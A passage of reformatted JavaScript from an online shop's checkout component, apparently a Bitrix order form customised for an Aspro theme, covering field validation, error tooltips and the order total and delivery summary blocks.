                children: [BX.create("I", {props: {className: "bx-calendar"}})]
            }), BX.insertAfter(addon, inputText), BX.remove(parentNode.querySelector("input[type=button]")), BX.bind(addon, "click", BX.delegate((function (e) {
                var target = e.target || e.srcElement,
                    parentNode = BX.findParent(target, {tagName: "DIV", className: "input-group"});
                BX.calendar({
                    node: parentNode.querySelector(".input-group-addon"),
                    field: parentNode.querySelector("input[type=text]").name,
                    form: "",
                    bTime: "Y" == settings.TIME,
                    bHideTime: !1
                })
            }), this))
        }, isValidForm: function () {
            if (!this.options.propertyValidation) return !0;
            var regionErrors = this.isValidRegionBlock(), propsErrors = this.isValidPropertiesBlock(), navigated = !1,
                tooltips, i;
            return regionErrors.length && (navigated = !0, this.animateScrollTo(this.deliveryBlockNode, 800, 50)), propsErrors.length && !navigated && setTimeout(BX.delegate((function () {
                this.animateScrollTo(this.propsBlockNode, 800, 50)
            }), this), 100), regionErrors.length ? (this.showError(this.deliveryBlockNode, regionErrors), BX.addClass(this.deliveryBlockNode, "bx-step-error"), this.deliveryBlockNode.classList.remove("bx-step-completed"), this.deliveryBlockNode.classList.remove("bx-selected"), this.opened[this.deliveryBlockNode.id] = !0) : (this.deliveryBlockNode.querySelector(".alert.alert-danger").style.display = "none", BX.cleanNode(this.deliveryBlockNode.querySelector(".alert.alert-danger")), BX.removeClass(this.deliveryBlockNode, "bx-step-error")), propsErrors.length ? (this.opened[this.propsBlockNode.id] || this.editProfile(), this.showError(this.propsBlockNode, propsErrors), BX.addClass(this.propsBlockNode, "bx-step-error")) : (this.propsBlockNode.querySelector(".alert.alert-danger").style.display = "none", BX.cleanNode(this.propsBlockNode.querySelector(".alert.alert-danger")), BX.removeClass(this.propsBlockNode, "bx-step-error")), !(regionErrors.length + propsErrors.length)
        }, isValidRegionBlock: function () {
            if (!this.options.propertyValidation) return [];
            var regionProps = this.orderBlockNode.querySelectorAll(".bx-soa-location-input-container[data-property-id-row]"),
                regionErrors = [], id, arProperty, data, i;
            for (i = 0; i < regionProps.length; i++) id = regionProps[i].getAttribute("data-property-id-row"), arProperty = this.validation.properties[id], data = this.getValidationData(arProperty, regionProps[i]), regionErrors = regionErrors.concat(this.isValidProperty(data, !0));
            return regionErrors = regionErrors.concat(this.isValidPropertiesBlock(!1, this.deliveryBlockNode))
        }, getValidationDataPhone: function (arProperty, propContainer) {
            var data = {}, inputs;
            switch (arProperty.TYPE) {
                case"STRING":
                    if (data.action = "blur", data.func = BX.delegate((function (input, fieldName) {
                        return this.validatePhone(input, arProperty, fieldName)
                    }), this), inputs = propContainer.querySelectorAll("input.phone"), $(inputs).length) {
                        data.inputs = inputs;
                        break
                    }
            }
            return data
        }, bindValidationPhone: function (id, propContainer) {
            if (this.validation.properties && this.validation.properties[id]) {
                var arProperty = this.validation.properties[id],
                    data = this.getValidationDataPhone(arProperty, propContainer), i, k;
                if (data && data.inputs && data.action) for (i = 0; i < $(data.inputs).length; i++) if (BX.type.isElementNode(data.inputs[i])) BX.bind(data.inputs[i], data.action, BX.delegate((function () {
                    this.isValidProperty(data)
                }), this)); else for (k = 0; k < $(data.inputs[i]).length; k++) BX.bind(data.inputs[i][k], data.action, BX.delegate((function () {
                    this.isValidProperty(data)
                }), this))
            }
        }, validatePhone: function (input, arProperty, fieldName) {
            if (!input || !arProperty) return [];
            var value = input.value, errors = [], name = BX.util.htmlspecialchars(arProperty.NAME),
                field = BX.message("SOA_FIELD") + ' "' + name + '"', re;
            if ("Y" == arProperty.REQUIRED && 0 == value.length && errors.push(field + " " + BX.message("SOA_REQUIRED")), "Y" == arProperty.IS_PHONE && value.length > 0) {
                function regexpPhone(value, element, regexp) {
                    var re;
                    return new RegExp(regexp).test(value)
                }

                var validPhone;
                regexpPhone($(input).val(), $(input), arAsproOptions.THEME.VALIDATE_PHONE_MASK) || errors.push(field + " " + BX.message("JS_FORMAT_ORDER"))
            }
            return errors
        }, isValidPropertiesBlock: function (excludeLocation, node, notShowError) {
            if (!this.options.propertyValidation) return [];
            var blockNode,
                props = (node || this.propsBlockNode).querySelectorAll(".bx-soa-customer-field[data-property-id-row]"),
                propsErrors = [], id, propContainer, arProperty, data, dataPhone, i;
            for (i = 0; i < props.length; i++) id = props[i].getAttribute("data-property-id-row"), excludeLocation && this.locations[id] || (propContainer = props[i].querySelector(".soa-property-container")) && (arProperty = this.validation.properties[id], data = this.getValidationData(arProperty, propContainer), dataPhone = this.getValidationDataPhone(arProperty, propContainer), data = $.extend({}, data, dataPhone), propsErrors = propsErrors.concat(this.isValidProperty(data, !0, notShowError)));
            return propsErrors
        }, isValidProperty: function (data, fieldName, notShowError) {
            var propErrors = [], inputErrors, i;
            if (!data || !data.inputs) return propErrors;
            for (i = 0; i < data.inputs.length; i++) (inputErrors = data.func(data.inputs[i], !!fieldName)).length && (propErrors[i] = inputErrors.join("<br>"));
            return notShowError || this.showValidationResult(data.inputs, propErrors), propErrors
        }, bindValidation: function (id, propContainer) {
            if (this.validation.properties && this.validation.properties[id]) {
                var arProperty = this.validation.properties[id],
                    data = this.getValidationData(arProperty, propContainer), i, k;
                if (data && data.inputs && data.action) for (i = 0; i < data.inputs.length; i++) if (BX.type.isElementNode(data.inputs[i])) BX.bind(data.inputs[i], data.action, BX.delegate((function () {
                    this.isValidProperty(data)
                }), this)); else for (k = 0; k < data.inputs[i].length; k++) BX.bind(data.inputs[i][k], data.action, BX.delegate((function () {
                    this.isValidProperty(data)
                }), this))
            }
        }, getValidationData: function (arProperty, propContainer) {
            if (arProperty && propContainer) {
                var data = {}, inputs;
                switch (arProperty.TYPE) {
                    case"STRING":
                        if (data.action = "change", data.func = BX.delegate((function (input, fieldName) {
                            return this.validateString(input, arProperty, fieldName)
                        }), this), (inputs = propContainer.querySelectorAll("input[type=text]")).length) {
                            data.inputs = inputs;
                            break
                        }
                        (inputs = propContainer.querySelectorAll("textarea")).length && (data.inputs = inputs);
                        break;
                    case"LOCATION":
                        if (data.func = BX.delegate((function (input, fieldName) {
                            return this.validateLocation(input, arProperty, fieldName)
                        }), this), (inputs = propContainer.querySelectorAll("input.bx-ui-sls-fake[type=text]")).length) {
                            data.inputs = inputs, data.action = "keyup";
                            break
                        }
                        (inputs = propContainer.querySelectorAll("div.bx-ui-slst-pool")).length && (data.inputs = inputs);
                        break;
                    case"Y/N":
                        data.inputs = propContainer.querySelectorAll("input[type=checkbox]"), data.action = "change", data.func = BX.delegate((function (input, fieldName) {
                            return this.validateCheckbox(input, arProperty, fieldName)
                        }), this);
                        break;
                    case"NUMBER":
                        data.inputs = propContainer.querySelectorAll("input[type=text]"), data.action = "blur", data.func = BX.delegate((function (input, fieldName) {
                            return this.validateNumber(input, arProperty, fieldName)
                        }), this);
                        break;
                    case"ENUM":
                        if ((inputs = propContainer.querySelectorAll("input[type=radio]")).length || (inputs = propContainer.querySelectorAll("input[type=checkbox]")), inputs.length) {
                            data.inputs = [inputs], data.action = "change", data.func = BX.delegate((function (input, fieldName) {
                                return this.validateEnum(input, arProperty, fieldName)
                            }), this);
                            break
                        }
                        (inputs = propContainer.querySelectorAll("option")).length && (data.inputs = [inputs], data.action = "click", data.func = BX.delegate((function (input, fieldName) {
                            return this.validateSelect(input, arProperty, fieldName)
                        }), this));
                        break;
                    case"FILE":
                        data.inputs = propContainer.querySelectorAll("input[type=file]"), data.action = "change", data.func = BX.delegate((function (input, fieldName) {
                            return this.validateFile(input, arProperty, fieldName)
                        }), this);
                        break;
                    case"DATE":
                        data.inputs = propContainer.querySelectorAll("input[type=text]"), data.action = "change", data.func = BX.delegate((function (input, fieldName) {
                            return this.validateDate(input, arProperty, fieldName)
                        }), this)
                }
                return data
            }
        }, showErrorTooltip: function (tooltipId, targetNode, text) {
            if (tooltipId && targetNode && text) {
                var tooltip = BX("tooltip-" + tooltipId), tooltipInner, quickLocation;
                text = this.uniqueText(text, "<br>"), tooltip ? tooltipInner = tooltip.querySelector("div.tooltip-inner") : (tooltipInner = BX.create("DIV", {props: {className: "tooltip-inner"}}), tooltip = BX.create("DIV", {
                    props: {
                        id: "tooltip-" + tooltipId,
                        className: "bx-soa-tooltip bx-soa-tooltip-static bx-soa-tooltip-danger tooltip top"
                    }, children: [BX.create("DIV", {props: {className: "tooltip-arrow"}}), tooltipInner]
                }), (quickLocation = targetNode.parentNode.querySelector("div.quick-locations")) && (targetNode = quickLocation), BX.insertAfter(tooltip, targetNode)), tooltipInner.innerHTML = text, "opened" != tooltip.getAttribute("data-state") && (tooltip.setAttribute("data-state", "opened"), tooltip.style.opacity = 0, tooltip.style.display = "block", new BX.easing({
                    duration: 150,
                    start: {opacity: 0},
                    finish: {opacity: 100},
                    transition: BX.easing.transitions.quad,
                    step: function (state) {
                        tooltip.style.opacity = state.opacity / 100
                    }
                }).animate())
            }
        }, closeErrorTooltip: function (tooltipId) {
            var tooltip = BX("tooltip-" + tooltipId);
            tooltip && (tooltip.setAttribute("data-state", "closed"), new BX.easing({
                duration: 150,
                start: {opacity: 100},
                finish: {opacity: 0},
                transition: BX.easing.transitions.quad,
                step: function (state) {
                    tooltip.style.opacity = state.opacity / 100
                },
                complete: function () {
                    tooltip.style.display = "none"
                }
            }).animate())
        }, showValidationResult: function (inputs, errors) {
            if (inputs && inputs.length && errors) {
                var input0 = BX.type.isElementNode(inputs[0]) ? inputs[0] : inputs[0][0], formGroup,
                    label = BX.findParent(input0, {tagName: "DIV", className: "form-group"}).querySelector("label"),
                    tooltipId, inputDiv, i;
                for (label && (tooltipId = label.getAttribute("for")), i = 0; i < inputs.length; i++) inputDiv = BX.findParent(inputs[i], {
                    tagName: "DIV",
                    className: "form-group"
                }), errors[i] && errors[i].length ? BX.addClass(inputDiv, "has-error") : BX.removeClass(inputDiv, "has-error");
                errors.length ? this.showErrorTooltip(tooltipId, label, errors.join("<br>")) : this.closeErrorTooltip(tooltipId)
            }
        }, validateString: function (input, arProperty, fieldName) {
            if (!input || !arProperty) return [];
            var value = input.value, errors = [], name = BX.util.htmlspecialchars(arProperty.NAME),
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + name + '"' : BX.message("SOA_FIELD"), re;
            return "Y" === arProperty.MULTIPLE ? errors : ("Y" === arProperty.REQUIRED && 0 === value.length && errors.push(field + " " + BX.message("SOA_REQUIRED")), value.length && (arProperty.MINLENGTH && arProperty.MINLENGTH > value.length && errors.push(BX.message("SOA_MIN_LENGTH") + ' "' + name + '" ' + BX.message("SOA_LESS") + " " + arProperty.MINLENGTH + " " + BX.message("SOA_SYMBOLS")), arProperty.MAXLENGTH && arProperty.MAXLENGTH < value.length && errors.push(BX.message("SOA_MAX_LENGTH") + ' "' + name + '" ' + BX.message("SOA_MORE") + " " + arProperty.MAXLENGTH + " " + BX.message("SOA_SYMBOLS")), "Y" === arProperty.IS_EMAIL && (input.value = value = BX.util.trim(value), value.length && ((re = /^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i).test(value) || errors.push(BX.message("SOA_INVALID_EMAIL")))), value.length > 0 && arProperty.PATTERN && arProperty.PATTERN.length && ((re = new RegExp(arProperty.PATTERN)).test(value) || errors.push(field + " " + BX.message("SOA_INVALID_PATTERN")))), errors)
        }, validateLocation: function (input, arProperty, fieldName) {
            if (!input || !arProperty) return [];
            var parent = BX.findParent(input, {tagName: "DIV", className: "form-group"}),
                value = this.getLocationString(parent), errors = [],
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + BX.util.htmlspecialchars(arProperty.NAME) + '"' : BX.message("SOA_FIELD");
            return "Y" == arProperty.MULTIPLE && "Y" !== arProperty.IS_LOCATION ? errors : ("Y" != arProperty.REQUIRED || 0 != value.length && value != BX.message("SOA_NOT_SPECIFIED") || errors.push(field + " " + BX.message("SOA_REQUIRED")), errors)
        }, validateCheckbox: function (input, arProperty, fieldName) {
            if (!input || !arProperty) return [];
            var errors = [],
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + BX.util.htmlspecialchars(arProperty.NAME) + '"' : BX.message("SOA_FIELD");
            return "Y" == arProperty.MULTIPLE ? errors : ("Y" != arProperty.REQUIRED || input.checked || errors.push(field + " " + BX.message("SOA_REQUIRED")), errors)
        }, validateNumber: function (input, arProperty, fieldName) {
            if (!input || !arProperty) return [];
            var value = input.value, errors = [], name = BX.util.htmlspecialchars(arProperty.NAME),
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + name + '"' : BX.message("SOA_FIELD"), num, del;
            return "Y" == arProperty.MULTIPLE ? errors : ("Y" == arProperty.REQUIRED && 0 == value.length && errors.push(field + " " + BX.message("SOA_REQUIRED")), value.length && (/[0-9]|\./.test(value) || errors.push(field + " " + BX.message("SOA_NOT_NUMERIC")), arProperty.MIN && parseFloat(arProperty.MIN) > parseFloat(value) && errors.push(BX.message("SOA_MIN_VALUE") + ' "' + name + '" ' + parseFloat(arProperty.MIN)), arProperty.MAX && parseFloat(arProperty.MAX) < parseFloat(value) && errors.push(BX.message("SOA_MAX_VALUE") + ' "' + name + '" ' + parseFloat(arProperty.MAX)), arProperty.STEP && parseFloat(arProperty.STEP) > 0 && (del = ((num = Math.abs(parseFloat(value) - (arProperty.MIN && parseFloat(arProperty.MIN) > 0 ? parseFloat(arProperty.MIN) : 0))) / parseFloat(arProperty.STEP)).toPrecision(12)) != parseInt(del) && errors.push(field + " " + BX.message("SOA_NUM_STEP") + " " + arProperty.STEP)), errors)
        }, validateEnum: function (inputs, arProperty, fieldName) {
            if (!inputs || !arProperty) return [];
            var values = [], errors = [], i,
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + BX.util.htmlspecialchars(arProperty.NAME) + '"' : BX.message("SOA_FIELD");
            if ("Y" == arProperty.MULTIPLE) return errors;
            for (i = 0; i < inputs.length; i++) (inputs[i].checked || inputs[i].selected) && values.push(i);
            return "Y" == arProperty.REQUIRED && 0 == values.length && errors.push(field + " " + BX.message("SOA_REQUIRED")), errors
        }, validateSelect: function (inputs, arProperty, fieldName) {
            if (!inputs || !arProperty) return [];
            var values = [], errors = [], i,
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + BX.util.htmlspecialchars(arProperty.NAME) + '"' : BX.message("SOA_FIELD");
            if ("Y" == arProperty.MULTIPLE) return errors;
            for (i = 0; i < inputs.length; i++) inputs[i].selected && values.push(i);
            return "Y" == arProperty.REQUIRED && 0 == values.length && errors.push(field + " " + BX.message("SOA_REQUIRED")), errors
        }, validateFile: function (inputs, arProperty, fieldName) {
            if (!inputs || !arProperty) return [];
            var errors = [], i, files = inputs.files || [],
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + BX.util.htmlspecialchars(arProperty.NAME) + '"' : BX.message("SOA_FIELD"),
                defaultValue = inputs.previousSibling.value, file, fileName, splittedName, fileExtension;
            if ("Y" == arProperty.MULTIPLE) return errors;
            if ("Y" != arProperty.REQUIRED || 0 != files.length || "" != defaultValue || arProperty.DEFAULT_VALUE && arProperty.DEFAULT_VALUE.length) for (i = 0; i < files.length; i++) file = files[i], fileName = BX.util.htmlspecialchars(file.name), fileExtension = (splittedName = file.name.split(".")).length > 1 ? splittedName[splittedName.length - 1].toLowerCase() : "", arProperty.ACCEPT.length > 0 && (0 == fileExtension.length || "-1" == arProperty.ACCEPT.indexOf(fileExtension)) && errors.push(BX.message("SOA_BAD_EXTENSION") + ' "' + fileName + '" (' + BX.util.htmlspecialchars(arProperty.ACCEPT) + ")"), file.size > parseInt(arProperty.MAXSIZE) && errors.push(BX.message("SOA_MAX_SIZE") + ' "' + fileName + '" (' + this.getSizeString(arProperty.MAXSIZE, 1) + ")"); else errors.push(field + " " + BX.message("SOA_REQUIRED"));
            return errors
        }, validateDate: function (input, arProperty, fieldName) {
            if (!input || !arProperty) return [];
            var value = input.value, errors = [], name = BX.util.htmlspecialchars(arProperty.NAME),
                field = fieldName ? BX.message("SOA_FIELD") + ' "' + name + '"' : BX.message("SOA_FIELD");
            return "Y" == arProperty.MULTIPLE ? errors : ("Y" == arProperty.REQUIRED && 0 == value.length && errors.push(field + " " + BX.message("SOA_REQUIRED")), errors)
        }, editPropsMap: function (propsNode) {
            var propsMapContainer = BX.create("DIV", {props: {className: "col-sm-12"}, style: {marginBottom: "10px"}}),
                map = BX.create("DIV", {props: {id: "propsMap"}, style: {width: "100%"}});
            propsMapContainer.appendChild(map), propsNode.appendChild(propsMapContainer)
        }, editPropsComment: function (propsNode) {
            var propsCommentContainer, label, input, div;
            propsCommentContainer = BX.create("DIV", {props: {className: "col-sm-12"}}), label = BX.create("LABEL", {
                attrs: {for: "orderDescription"},
                props: {className: "bx-soa-customer-label"},
                html: this.params.MESS_ORDER_DESC
            }), input = BX.create("TEXTAREA", {
                props: {
                    id: "orderDescription",
                    cols: "4",
                    className: "form-control bx-soa-customer-textarea bx-ios-fix",
                    name: "ORDER_DESCRIPTION"
                }, text: this.result.ORDER_DESCRIPTION ? this.result.ORDER_DESCRIPTION : ""
            }), div = BX.create("DIV", {
                props: {className: "form-group bx-soa-customer-field"},
                children: [label, input]
            });
            const $divInner = BX.create("DIV", {
                props: {className: "bx-soa-pp-company-item group-without-margin"},
                children: [div]
            });
            propsCommentContainer.appendChild($divInner), propsNode.appendChild(propsCommentContainer)
        }, editTotalBlock: function () {
            if (this.totalInfoBlockNode && this.result.TOTAL) {
                var total = this.result.TOTAL, priceHtml, params = {}, discText, valFormatted, i, curDelivery,
                    deliveryError, deliveryValue, showOrderButton = "Y" === this.params.SHOW_TOTAL_ORDER_BUTTON,
                    totalName;
                if (BX.cleanNode(this.totalInfoBlockNode), this.fixStikerBlock(), 0 === parseFloat(total.ORDER_PRICE) ? (priceHtml = this.params.MESS_PRICE_FREE, params.free = !0) : priceHtml = total.ORDER_PRICE_FORMATED, this.options.showPayedFromInnerBudget ? (this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_IT"), total.ORDER_TOTAL_LEFT_TO_PAY_FORMATED, {total: !0})), this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_PAYED"), '<span class="payed">' + total.PAYED_FROM_ACCOUNT_FORMATED + "</span>"))) : this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_IT"), total.ORDER_TOTAL_PRICE_FORMATED, {total: !0})), this.result.SERVICES_IN_ORDER ? (this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("ORDER_ITEMS_TITLE") + ", " + total.ITEMS_COUNT + BX.message("ORDER_MEASURE_TITLE"), total.ITEMS_SUMM, params)), this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("ORDER_SERVICES_TITLE") + ", " + this.result.SERVICES_ITEMS.COUNT + BX.message("ORDER_MEASURE_TITLE"), this.result.SERVICES_ITEMS.SUMM_FORMATTED, params))) : (totalName = BX.message("SOA_SUM_SUMMARY"), this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_SUMMARY"), priceHtml, params))), this.options.showOrderWeight && this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_WEIGHT_SUM"), total.ORDER_WEIGHT_FORMATED)), this.options.showTaxList) for (i = 0; i < total.TAX_LIST.length; i++) valFormatted = total.TAX_LIST[i].VALUE_MONEY_FORMATED || "", this.totalInfoBlockNode.appendChild(this.createTotalUnit(total.TAX_LIST[i].NAME + (total.TAX_LIST[i].VALUE_FORMATED ? " " + total.TAX_LIST[i].VALUE_FORMATED : "") + ":", valFormatted));
                if (params = {}, (deliveryError = (curDelivery = this.getSelectedDelivery()) && curDelivery.CALCULATE_ERRORS && curDelivery.CALCULATE_ERRORS.length) ? (deliveryValue = BX.message("SOA_NOT_CALCULATED"), params.error = deliveryError) : 0 === parseFloat(total.DELIVERY_PRICE) ? (deliveryValue = this.params.MESS_PRICE_FREE, params.free = !0) : deliveryValue = total.DELIVERY_PRICE_FORMATED, this.result.DELIVERY.length && this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_SUM_DELIVERY"), deliveryValue, params)), this.options.showDiscountPrice && (discText = this.params.MESS_ECONOMY, total.DISCOUNT_PERCENT_FORMATED && parseFloat(total.DISCOUNT_PERCENT_FORMATED) > 0 && (discText += total.DISCOUNT_PERCENT_FORMATED), this.totalInfoBlockNode.appendChild(this.createTotalUnit(discText + ":", total.DISCOUNT_PRICE_FORMATED, {highlighted: !0}))), parseFloat(total.PAY_SYSTEM_PRICE) >= 0 && this.result.DELIVERY.length && this.totalInfoBlockNode.appendChild(this.createTotalUnit(BX.message("SOA_PAYSYSTEM_PRICE"), "~" + total.PAY_SYSTEM_PRICE_FORMATTED)), !this.result.SHOW_AUTH) {
                    this.editCoupons(this.totalInfoBlockNode), this.showTotalDeliveryInfo(), this.showTotalPaymentInfo(), this.totalInfoBlockNode.appendChild(BX.create("DIV", {
                        props: {className: "bx-soa-cart-total-button-container lic_condition" + (showOrderButton ? "" : " visible-xs")},
                        children: [BX.create("A", {
                            props: {
                                href: "javascript:void(0)",
                                className: "btn btn-default btn-lg btn-order-save"
                            }, html: this.params.MESS_ORDER, events: {click: BX.proxy(this.clickOrderSaveAction, this)}
                        })]
                    }));
                    const conditions = [];
                    if ("Y" == arAsproOptions.THEME.SHOW_LICENCE) {
                        conditions.push(BX.create("span", {text: BX.message("CONDITIONS_TEXT_ON")}));
                        let href = arAsproOptions.SITE_DIR + "include/licenses_detail.php",
                            tmpUrl = BX.message("LICENSES_TEXT").match(/href="(.+?)"/);
                        tmpUrl && (href = tmpUrl[1]), conditions.push(BX.create("a", {
                            props: {href: href},
                            text: BX.message("CONDITIONS_TEXT_DATA")
                        }))
                    }
                    if ("Y" == arAsproOptions.THEME.SHOW_OFFER) {
                        "Y" == arAsproOptions.THEME.SHOW_LICENCE && conditions.push(BX.create("span", {text: BX.message("CONDITIONS_TEXT_AND")}));
                        let href = arAsproOptions.SITE_DIR + "include/offer_detail.php",
                            tmpUrl = BX.message("OFFER_TEXT").match(/href="(.+?)"/);
                        tmpUrl && (href = tmpUrl[1]), conditions.push(BX.create("a", {
                            props: {href: href},
                            text: BX.message("CONDITIONS_TEXT_OFFERTA")
                        }))
                    }
                    conditions.length > 0 && (conditions.unshift(BX.create("span", {text: BX.message("CONDITIONS_TEXT")})), this.totalBlockNode.querySelector(".bx-soa-cart-conditions") || this.totalBlockNode.querySelector(".bx-soa-total-wrapper").appendChild(BX.create("DIV", {
                        props: {className: "bx-soa-cart-conditions"},
                        children: [BX.create("div", {
                            props: {className: "bx-soa-cart-conditions-text font_xs"},
                            children: conditions
                        })]
                    })))
                }
                this.editMobileTotalBlock()
            }
        }, fixStikerBlock: function () {
            var totalNodes = this.totalBlockNode.querySelector(".bx-soa-total-wrapper");
            if ("Y" === arAsproOptions.THEME.TOP_MENU_FIXED) {
                totalNodes.classList.add("sticky_top");
                let $header = document.querySelector("#header");
                document.querySelector("#headerfixed > div") && ($header = document.querySelector("#headerfixed")), $header && (totalNodes.style.top = $header.clientHeight - 2 + "px")
            }
        }, editMobileTotalBlock: function () {
            this.result.SHOW_AUTH ? BX.removeClass(this.mobileTotalBlockNode, "visible-xs") : BX.addClass(this.mobileTotalBlockNode, "visible-xs"), BX.cleanNode(this.mobileTotalBlockNode), this.mobileTotalBlockNode.appendChild(this.totalInfoBlockNode.cloneNode(!0)), BX.bind(this.mobileTotalBlockNode.querySelector("a.bx-soa-price-not-calc"), "click", BX.delegate((function () {
                this.animateScrollTo(this.deliveryBlockNode)
            }), this)), BX.bind(this.mobileTotalBlockNode.querySelector("a.btn-order-save"), "click", BX.proxy(this.clickOrderSaveAction, this))
        }, showTotalDeliveryInfo: function () {
            const curDelivery = this.getSelectedDelivery();
            if (curDelivery && (this.totalInfoBlockNode.appendChild(this.createTotalScrollInfo(BX.message("ORDER_TOTAL_DELIVERY_TITLE"), curDelivery.NAME, this.deliveryBlockNode)), curDelivery.PERIOD_TEXT)) {
                let curDeliveryTotal = curDelivery.PERIOD_TEXT;
                const tempDiv = document.createElement("div");
                tempDiv.innerHTML = curDeliveryTotal;
                const removeChild = tempDiv.querySelectorAll("select, input, button, iframe, a, br, hr, img");
                if (removeChild) {
                    for (let i = removeChild.length - 1; i > -1; i--) BX.remove(removeChild[i]);
                    curDeliveryTotal = tempDiv.innerHTML.replace(/<[^/>][^>]*><\/[^>]+>/g, "").trim()
                }
                this.totalInfoBlockNode.appendChild(BX.create("div", {
                    props: {className: "total-delivery-info font_xs"},
                    text: curDeliveryTotal
                }))
            }
        }, showTotalPaymentInfo: function () {
            const currentPaySystem = this.getSelectedPaySystem();
            currentPaySystem && this.totalInfoBlockNode.appendChild(this.createTotalScrollInfo(BX.message("ORDER_TOTAL_PAYMENT_TITLE"), currentPaySystem.NAME, this.paySystemBlockNode))
        }, createTotalScrollInfo: function (name, info, block) {
            return BX.create("div", {
                props: {className: "total-scroll-info font_sm"},
                children: [BX.create("div", {
                    props: {className: "total-scroll-info__title"},
                    text: name + ":"
                }), BX.create("div", {
                    props: {className: "total-scroll-info__value" + (block.classList.contains("hidden") ? " " : " colored_theme_text_with_hover wborder")},
                    html: "<span>" + info + "</span>",
                    events: {
                        click: BX.delegate((function () {
                            block.classList.contains("hidden") || this.animateScrollTo(block)
                        }), this)
                    }
                })]
            })
        }, createTotalUnit: function (name, value, params) {
            var totalValue, className = "bx-soa-cart-total-line";
            return name = name || "", value = value || "", totalValue = (params = params || {}).error ? [BX.create("A", {
                props: {className: "bx-soa-price-not-calc"},
                html: value,
                events: {
                    click: BX.delegate((function () {
                        this.animateScrollTo(this.deliveryBlockNode)
                    }), this)
                }
            })] : params.free ? [BX.create("SPAN", {
                props: {className: "bx-soa-price-free"},
                html: value
            })] : [value], params.total && (className += " bx-soa-cart-total-line-totals"), params.highlighted && (className += " bx-soa-cart-total-line-highlighted"), BX.create("DIV", {
                props: {className: className},
                children: [BX.create("SPAN", {
                    props: {className: "bx-soa-cart-t"},
                    text: name
                }), BX.create("SPAN", {
                    props: {className: "bx-soa-cart-d" + (params.total && this.options.totalPriceChanged ? " bx-soa-changeCostSign" : "")},
                    children: totalValue
                })]
            })
        }, basketBlockScrollCheckEvent: function (e) {
            var target = e.target || e.srcElement, scrollLeft = target.scrollLeft,
                scrollRight = target.scrollWidth - (scrollLeft + target.clientWidth), parent = target.parentNode;
            0 == scrollLeft ? BX.removeClass(parent, "bx-soa-table-fade-left") : BX.addClass(parent, "bx-soa-table-fade-left"), 0 == scrollRight ? BX.removeClass(parent, "bx-soa-table-fade-right") : BX.addClass(parent, "bx-soa-table-fade-right")
        }, basketBlockScrollCheck: function () {
            var scrollableNodes = this.orderBlockNode.querySelectorAll("div.bx-soa-table-fade"), parentNode,
                parentWidth, tableNode, tableWidth, i, scrollNode, scrollLeft, scrollRight, scrollable = !1;
            for (i = 0; i < scrollableNodes.length; i++) tableNode = (parentNode = scrollableNodes[i]).querySelector("table.bx-soa-item-table"), parentWidth = parentNode.clientWidth, tableWidth = tableNode.clientWidth || 0, (scrollable = scrollable || tableWidth > parentWidth) ? (scrollLeft = (scrollNode = BX.firstChild(parentNode)).scrollLeft, scrollRight = scrollNode.scrollWidth - (scrollLeft + scrollNode.clientWidth), 0 == scrollLeft ? BX.removeClass(parentNode, "bx-soa-table-fade-left") : BX.addClass(parentNode, "bx-soa-table-fade-left"), 0 == scrollRight ? BX.removeClass(parentNode, "bx-soa-table-fade-right") : BX.addClass(parentNode, "bx-soa-table-fade-right"), 0 == scrollLeft && 0 == scrollRight && BX.addClass(parentNode, "bx-soa-table-fade-right")) : BX.removeClass(parentNode, "bx-soa-table-fade-left bx-soa-table-fade-right")
        }, totalBlockScrollCheck: function () {
            if (this.totalInfoBlockNode && this.totalGhostBlockNode) {
                var scrollTop = BX.GetWindowScrollPos().scrollTop, ghostTop = BX.pos(this.totalGhostBlockNode).top,
                    ghostBottom = BX.pos(this.orderBlockNode).bottom, width, offset = 0,
                    headerFixed = BX("headerfixed");
                headerFixed && BX.hasClass(headerFixed, "fixed") && (offset = headerFixed.offsetHeight + 20), ghostBottom - this.totalBlockNode.offsetHeight < scrollTop + 20 ? BX.addClass(this.totalInfoBlockNode, "bx-soa-cart-total-bottom") : BX.removeClass(this.totalInfoBlockNode, "bx-soa-cart-total-bottom"), scrollTop + offset > ghostTop && !BX.hasClass(this.totalInfoBlockNode, "bx-soa-cart-total-fixed") ? (width = this.totalInfoBlockNode.offsetWidth, BX.addClass(this.totalInfoBlockNode, "bx-soa-cart-total-fixed"), this.totalGhostBlockNode.style.paddingTop = this.totalInfoBlockNode.offsetHeight + "px", this.totalInfoBlockNode.style.width = width + "px") : scrollTop + offset < ghostTop && BX.hasClass(this.totalInfoBlockNode, "bx-soa-cart-total-fixed") && (BX.removeClass(this.totalInfoBlockNode, "bx-soa-cart-total-fixed"), this.totalGhostBlockNode.style.paddingTop = 0, this.totalInfoBlockNode.style.width = "")
            }
        }, totalBlockResizeCheck: function () {
            this.totalInfoBlockNode && this.totalGhostBlockNode && BX.hasClass(this.totalInfoBlockNode, "bx-soa-cart-total-fixed") && (this.totalInfoBlockNode.style.width = this.totalGhostBlockNode.offsetWidth + "px")
        }, totalBlockFixFont: function () {
            var totalNode = this.totalInfoBlockNode.querySelector(".bx-soa-cart-total-line.bx-soa-cart-total-line-totals"),
                buttonNode, target, objList = [];
            totalNode && (target = BX.lastChild(totalNode), objList.push({
                node: target,
                maxFontSize: 28,
                smallestValue: !1,
                scaleBy: target.parentNode
            })), "Y" == this.params.SHOW_TOTAL_ORDER_BUTTON && (buttonNode = this.totalInfoBlockNode.querySelector(".bx-soa-cart-total-button-container")) && (target = BX.lastChild(buttonNode), objList.push({
                node: target,
